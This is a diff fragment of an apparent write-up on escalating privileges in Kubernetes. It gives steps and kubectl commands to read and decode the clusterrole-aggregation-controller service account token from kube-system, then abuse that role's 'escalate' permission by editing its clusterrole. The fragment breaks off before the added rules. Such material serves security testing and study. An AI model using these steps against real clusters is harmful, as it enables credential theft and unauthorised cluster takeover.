@@ -9,7 +9,7 @@ Now the question is, which secret to use. The first option might be the clusterr
 
 3. This will give you the clusterrole-aggregation-controller token `kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND] -o json`
 4. base64 decode the token field
-5. Use the token as part of a kubectl command  `kubectl --as test --as=group=system:masters --token="[TOKEN]" get clusterroles` to confirm it's working
+5. Use the token as part of a kubectl command  `kubectl --token="[TOKEN]" get clusterroles` to confirm it's working
 6. Edit the service account for the token you're using (weird but this particular service account token has the "escalate" permission which lets you do this) `kubectl edit clusterrole system:controller:clusterrole-aggregation-controller`
 
 Add the following lines in the "rules" section
